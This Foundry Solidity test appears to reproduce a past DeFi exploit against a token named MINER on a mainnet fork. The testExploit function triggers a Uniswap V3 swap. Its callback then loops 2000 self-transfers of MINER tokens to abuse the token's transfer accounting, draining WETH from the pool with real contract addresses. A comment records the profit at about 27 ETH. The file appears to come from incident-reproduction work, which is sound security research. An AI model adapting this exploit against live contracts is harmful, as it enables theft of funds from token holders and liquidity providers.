// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IUniswapV3.sol";

import "./IMiner.sol";

IUniswapV3Pool constant WETH_MINER_Pool = IUniswapV3Pool(
    0x732276168b421D4792E743711E1A48172EA574a2
);
IMiner constant MINER = IMiner(0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD);
IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

contract MinerTest is Test {
    function setUp() public {
        // evm_version Requires to be "shanghai"
        vm.createSelectFork("mainnet", 19226508 - 1);
        vm.label(address(MINER), "MINER");
        vm.label(address(WETH_MINER_Pool), "WETH_MINER_Pool");
        vm.label(address(WETH), "WETH");

        // init
        deal(address(MINER), address(this), 3.572592720467130237 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("ETH balance before", WETH.balanceOf(address(this)), 18);

        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_340;
        bytes memory data = abi.encodePacked(uint8(0x61));
        WETH_MINER_Pool.swap(
            address(this),
            false, // zeroForOne,
            999.999999999999998 ether, // amountSpecified
            sqrtPriceLimitX96,
            data
        );

        print("ETH balance after", WETH.balanceOf(address(this)), 18);
        // ETH balance after: 27.077994095269408515
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        amount0Delta;
        amount1Delta;
        data;
        MINER.balanceOf(address(this));
        for (uint256 i = 0; i < 2000; i++) {
            MINER.transfer(address(WETH_MINER_Pool), 499999999999999999);
            MINER.transfer(address(this), 499999999999999999);
        }
    }
}
